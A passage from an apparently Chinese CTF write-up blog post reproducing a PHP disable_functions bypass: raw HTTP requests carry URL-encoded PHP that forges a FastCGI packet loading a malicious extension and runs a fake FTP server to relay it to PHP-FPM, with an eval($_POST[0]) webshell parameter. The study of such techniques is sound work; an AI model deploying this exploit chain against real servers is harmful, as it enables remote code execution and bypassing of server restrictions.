+Cookie: CFADMIN_LASTPAGE_ADMIN&#x3D;&#x2F;CFIDE&#x2F;administrator&#x2F;homepage.cfm; COOKIE_LAST_ADMIN_USER&#x3D;admin; cookies_accepted&#x3D;1; well_sid&#x3D;nl9gu4co34r1bpog7u946iov81; well_token&#x3D;b26urUKc_2BIdfp3R_2FJwL0AkuWVW1QVsewdxCt3PvN9UPZGHoPIlXZ9PAZ1IxeT9pODiBxFPA6ukUv03tsHXuZMUbnQplMvSeHX3DHMVBDcid73IFSnx5G7JEu9tknt6fD; CMSIC3e35dee27c&#x3D;5i22pimbpeacmo49f4m7ib90c0; CMSSESSIDb7b466a3dca5&#x3D;ad602g7grpu5ln0u69plinfuv0
+Connection: close
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 2159
+
+0&#x3D;%24%70%61%79%6c%6f%61%64%3d%75%72%6c%64%65%63%6f%64%65%28%27%25%30%31%25%30%31%25%30%30%25%30%31%25%30%30%25%30%38%25%30%30%25%30%30%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%31%25%41%41%25%30%30%25%30%30%25%31%31%25%30%42%47%41%54%45%57%41%59%5f%49%4e%54%45%52%46%41%43%45%46%61%73%74%43%47%49%25%32%46%31%2e%30%25%30%45%25%30%34%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%25%30%46%25%31%37%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%25%32%46%76%61%72%25%32%46%77%77%77%25%32%46%68%74%6d%6c%25%32%46%69%6e%64%65%78%2e%70%68%70%25%30%42%25%30%41%53%43%52%49%50%54%5f%4e%41%4d%45%25%32%46%69%6e%64%65%78%2e%70%68%70%25%30%42%25%30%41%52%45%51%55%45%53%54%5f%55%52%49%25%32%46%69%6e%64%65%78%2e%70%68%70%25%30%46%34%50%48%50%5f%41%44%4d%49%4e%5f%56%41%4c%55%45%6f%70%65%6e%5f%62%61%73%65%64%69%72%25%33%44%25%32%46%25%30%41%65%78%74%65%6e%73%69%6f%6e%5f%64%69%72%25%33%44%25%32%46%74%6d%70%25%30%41%65%78%74%65%6e%73%69%6f%6e%25%33%44%65%76%61%6c%2e%73%6f%25%30%41%25%30%46%25%31%31%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%70%68%70%25%32%46%66%61%73%74%63%67%69%63%6c%69%65%6e%74%25%30%42%25%30%39%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%25%30%42%25%30%34%52%45%4d%4f%54%45%5f%50%4f%52%54%38%38%36%36%25%30%42%25%30%39%53%45%52%56%45%52%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%25%30%42%25%30%32%53%45%52%56%45%52%5f%50%4f%52%54%38%30%25%30%42%25%30%39%53%45%52%56%45%52%5f%4e%41%4d%45%6c%6f%63%61%6c%68%6f%73%74%25%30%46%25%30%38%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%25%32%46%31%2e%31%25%30%43%25%32%31%43%4f%4e%54%45%4e%54%5f%54%59%50%45%61%70%70%6c%69%63%61%74%69%6f%6e%25%32%46%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%25%30%45%25%30%31%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%35%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%27%29%3b%66%69%6c%65%5f%70%75%74%5f%63%6f%6e%74%65%6e%74%73%28%27%66%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%34%36%38%31%39%2f%61%61%61%27%2c%24%70%61%79%6c%6f%61%64%29%3b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?glzjin&#x3D;eval($_POST[0]); HTTP&#x2F;1.1
+Host: 127.0.0.1:20001
+sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;95&quot;, &quot;;Not A Brand&quot;;v&#x3D;&quot;99&quot;
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: &quot;Windows&quot;
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.69 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Cookie: CFADMIN_LASTPAGE_ADMIN&#x3D;&#x2F;CFIDE&#x2F;administrator&#x2F;homepage.cfm; COOKIE_LAST_ADMIN_USER&#x3D;admin; cookies_accepted&#x3D;1; well_sid&#x3D;nl9gu4co34r1bpog7u946iov81; well_token&#x3D;b26urUKc_2BIdfp3R_2FJwL0AkuWVW1QVsewdxCt3PvN9UPZGHoPIlXZ9PAZ1IxeT9pODiBxFPA6ukUv03tsHXuZMUbnQplMvSeHX3DHMVBDcid73IFSnx5G7JEu9tknt6fD; CMSIC3e35dee27c&#x3D;5i22pimbpeacmo49f4m7ib90c0; CMSSESSIDb7b466a3dca5&#x3D;ad602g7grpu5ln0u69plinfuv0
+Connection: close
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 3059
+
+0&#x3D;%24%73%6f%63%6b%65%74%20%3d%20%73%74%72%65%61%6d%5f%73%6f%63%6b%65%74%5f%73%65%72%76%65%72%28%22%74%63%70%3a%2f%2f%30%2e%30%2e%30%2e%30%3a%34%36%38%31%39%22%2c%20%24%65%72%72%6e%6f%2c%20%24%65%72%72%73%74%72%29%3b%0d%0a%69%66%20%28%21%24%73%6f%63%6b%65%74%29%20%7b%0d%0a%20%20%65%63%68%6f%20%22%24%65%72%72%73%74%72%20%28%24%65%72%72%6e%6f%29%3c%62%72%20%2f%3e%5c%6e%22%3b%0d%0a%7d%20%65%6c%73%65%20%7b%0d%0a%20%20%77%68%69%6c%65%20%28%24%63%6f%6e%6e%20%3d%20%73%74%72%65%61%6d%5f%73%6f%63%6b%65%74%5f%61%63%63%65%70%74%28%24%73%6f%63%6b%65%74%29%29%20%7b%0d%0a%20%20%20%20%66%77%72%69%74%65%28%24%63%6f%6e%6e%2c%20%22%32%31%30%20%46%61%6b%65%20%46%54%50%5c%6e%22%29%3b%0d%0a%20%20%20%20%24%6c%69%6e%65%20%3d%20%66%67%65%74%73%28%24%63%6f%6e%6e%29%3b%0d%0a%20%20%20%20%65%63%68%6f%20%24%6c%69%6e%65%3b%20%2f%2f%20%55%53%45%52%0d%0a%20%20%20%20%66%77%72%69%74%65%28%24%63%6f%6e%6e%2c%20%22%32%33%30%20%4c%6f%67%69%6e%20%73%75%63%63%65%73%73%66%75%6c%5c%6e%22%29%3b%0d%0a%20%20%20%20%24%6c%69%6e%65%20%3d%20%66%67%65%74%73%28%24%63%6f%6e%6e%29%3b%0d%0a%20%20%20%20%65%63%68%6f%20%24%6c%69%6e%65%3b%20%2f%2f%20%54%59%50%45%0d%0a%20%20%20%20%66%77%72%69%74%65%28%24%63%6f%6e%6e%2c%20%22%32%30%30%20%78%78%5c%6e%22%29%3b%0d%0a%20%20%20%20%24%6c%69%6e%65%20%3d%20%66%67%65%74%73%28%24%63%6f%6e%6e%29%3b%0d%0a%20%20%20%20%65%63%68%6f%20%24%6c%69%6e%65%3b%20%2f%2f%20%53%49%5a%45%0d%0a%20%20%20%20%66%77%72%69%74%65%28%24%63%6f%6e%6e%2c%20%22%35%35%30%20%78%78%5c%6e%22%29%3b%0d%0a%20%20%20%20%24%6c%69%6e%65%20%3d%20%66%67%65%74%73%28%24%63%6f%6e%6e%29%3b%0d%0a%20%20%20%20%65%63%68%6f%20%24%6c%69%6e%65%3b%20%2f%2f%20%45%50%53%56%0d%0a%20%20%20%20%66%77%72%69%74%65%28%24%63%6f%6e%6e%2c%20%22%35%30%30%20%77%74%66%5c%6e%22%29%3b%0d%0a%20%20%20%20%24%6c%69%6e%65%20%3d%20%66%67%65%74%73%28%24%63%6f%6e%6e%29%3b%0d%0a%20%20%20%20%65%63%68%6f%20%24%6c%69%6e%65%3b%20%2f%2f%20%50%41%53%56%0d%0a%20%20%20%20%24%69%70%20%3d%20%27%31%32%37%2e%30%2e%30%2e%31%27%3b%0d%0a%20%20%20%20%24%70%6f%72%74%20%3d%20%31%31%34%35%31%3b%0d%0a%20%20%20%20%24%70%6f%72%74%68%20%3d%20%66%6c%6f%6f%72%28%24%70%6f%72%74%20%2f%20%32%35%36%29%3b%0d%0a%20%20%20%20%24%70%6f%72%74%6c%20%3d%20%24%70%6f%72%74%20%25%20%32%35%36%3b%0d%0a%20%20%20%20%66%77%72%69%74%65%28%24%63%6f%6e%6e%2c%20%22%32%32%37%20%45%6e%74%65%72%69%6e%67%20%50%61%73%73%69%76%65%20%4d%6f%64%65%2e%20%22%2e%73%74%72%5f%72%65%70%6c%61%63%65%28%27%2e%27%2c%27%2c%27%2c%24%69%70%29%2e%22%2c%24%70%6f%72%74%68%2c%24%70%6f%72%74%6c%5c%6e%22%29%3b%0d%0a%20%20%20%20%24%6c%69%6e%65%20%3d%20%66%67%65%74%73%28%24%63%6f%6e%6e%29%3b%0d%0a%20%20%20%20%65%63%68%6f%20%24%6c%69%6e%65%3b%20%2f%2f%20%53%54%4f%52%0d%0a%0d%0a%20%20%20%20%66%77%72%69%74%65%28%24%63%6f%6e%6e%2c%20%22%31%32%35%20%47%4f%47%4f%47%4f%21%5c%6e%22%29%3b%0d%0a%20%20%20%20%73%6c%65%65%70%28%31%29%3b%0d%0a%20%20%20%20%66%77%72%69%74%65%28%24%63%6f%6e%6e%2c%20%22%32%32%36%20%54%68%61%6e%6b%73%21%5c%6e%22%29%3b%0d%0a%20%20%20%20%66%63%6c%6f%73%65%28%24%63%6f%6e%6e%29%3b%0d%0a%20%20%7d%0d%0a%20%20%66%63%6c%6f%73%65%28%24%73%6f%63%6b%65%74%29%3b%0d%0a%7d%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再次感觉到，看别人的wp和自己动手复现出来真的差别很大</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20220704220756092.png" alt="image-20220704220756092"></p>
+<p><strong>记录疑惑：设置open_basedir=”/“后有概率成功列出根目录文件</strong> 。我尝试把disable_functions置空，但失败了，在P神的这篇文章找到了原因。</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20220704224803287.png" alt="image-20220704224803287"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6951.html">https://www.zhaoj.in/read-6951.html</a> （赵总自己的wp）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/120984108">https://blog.csdn.net/rfrder/article/details/120984108</a> (feng师傅的wp)</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253122#h2-4">https://www.anquanke.com/post/id/253122#h2-4</a> (深入 FTP 攻击 php-fpm 绕过 disable_functions)</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/15211484.html">https://www.cnblogs.com/yesec/p/15211484.html</a> （烨）</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> （Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞）</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/10/docker%E6%90%AD%E5%BB%BAphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88%E9%99%84docker%E7%8E%AF%E5%A2%83%EF%BC%89/" rel="prev" title="docker搭建php-xdebug调试环境（附docker环境）">
+      <i class="fa fa-chevron-left"></i> docker搭建php-xdebug调试环境（附docker环境）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0-%E7%94%A8%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">复现(用到的知识点)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">3.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <!--<span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>-->
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+</body>
+</html>
